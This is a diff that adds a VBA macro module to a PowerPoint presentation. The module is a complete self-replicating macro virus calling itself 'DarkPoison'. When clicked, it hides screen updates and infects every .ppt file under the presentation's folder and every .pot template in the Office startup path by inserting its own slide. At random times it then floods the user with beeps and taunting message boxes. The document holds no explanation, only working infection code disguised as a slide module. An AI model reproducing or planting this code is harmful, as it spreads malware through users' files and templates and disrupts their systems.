@@ -1,0 +1,51 @@
+   VERSION 1.0 CLASS
+   BEGIN
+     MultiUse = -1  'True
+   END
+   Attribute VB_Name = "Slide1"
+   Attribute VB_GlobalNameSpace = False
+   Attribute VB_Creatable = False
+   Attribute VB_PredeclaredId = True
+   Attribute VB_Exposed = True
+   Private Sub milenium_Click()
+   Application.ScreenUpdating = False
+   hpath = ActivePresentation.FullName
+   With Application.FileSearch
+   .NewSearch
+   .LookIn = ActivePresentation.Path
+   .SearchSubFolders = True
+   .FileName = "*.ppt"
+   End With
+   For cq = 1 To Application.FileSearch.FoundFiles.Count
+   Set futureh = Presentations.Open(Application.FileSearch.FoundFiles(cq))
+   If futureh.Slides(1).Name <> "DarkPoison" Then
+   futureh.Slides.InsertFromFile hpath, 1, 1, -1
+   futureh.Save
+   End If
+   futureh.Close
+   Next cq
+   With Application.FileSearch
+   .NewSearch
+   .LookIn = Application.StartupPath
+   .SearchSubFolders = True
+   .FileName = "*.pot"
+   End With
+   For cq = 1 To Application.FileSearch.FoundFiles.Count
+   Set futureh = Presentations.Open(Application.FileSearch.FoundFiles(cq))
+   If futureh.Slides(1).Name <> "DarkPoison" Then
+   futureh.Slides.InsertFromFile hpath, 1, 1, -1
+   futureh.Save
+   End If
+   futureh.Close
+   Next cq
+   Application.ScreenUpdating = False
+   If Minute(Now) = Int(60 * Rnd) Then
+   MsgBox "Every time that AntiVirus companies detects a virus," & vbCr & "we(the VX xcene) come up with a new infection tech.", vbCritical, "Yozak in the new MILENIUM"
+   MsgBox "Our scene is too active for you!" & vbCr & "So lamers get the hell out of here" & vbCr & "You make me sick", vbOKOnly, "Yozak in the new MILENIUM"
+   For v = 1 To Int(5000 * Rnd)
+   Beep
+   MsgBox "Lamers BEWARE !!", vbApplicationModal, "Yozak in the new melium"
+   Next v
+   MsgBox "YOZAC enters the new milenium with a DARKPOISoN!!!!", vbMsgBoxSetForeground, "DARKPOISoN"
+   End If
+   End Sub
